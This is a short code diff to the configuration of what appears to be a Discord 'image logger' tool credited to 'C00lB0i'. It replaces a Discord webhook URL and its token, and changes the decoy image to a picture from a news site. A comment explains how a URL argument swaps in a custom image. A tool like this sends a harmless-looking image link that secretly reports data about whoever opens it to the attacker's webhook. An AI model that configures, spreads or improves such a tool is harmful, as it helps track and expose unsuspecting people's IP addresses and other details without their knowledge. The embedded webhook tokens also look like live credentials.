@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1388690600924151839/1fhzOKLZ3Gs1bQbQWj-Tq0EoBfj4896RqwyUytgw_FqDrCIOUVniAXaiP3bvbdSnE2ak",
-    "image": "https://cdn.discordapp.com/attachments/1331589199433826408/1385206940870774794/68539225572794655.gif?ex=6861c03e&is=68606ebe&hm=63f44195944f4e170e777268d875e467331b7078b67763c397c41f94df6c0aa8&", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1391709864849309787/3Wwj0ELp8Dvxnj7_bcT5tQWU_bBkmV8eb9X4eSZbmMoocxDwBuY3hhwCHZd9eSY6H-l4",
+    "image": "https://www.emaratalyoum.com/polopoly_fs/1.1871207.1722063642!/image/image.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
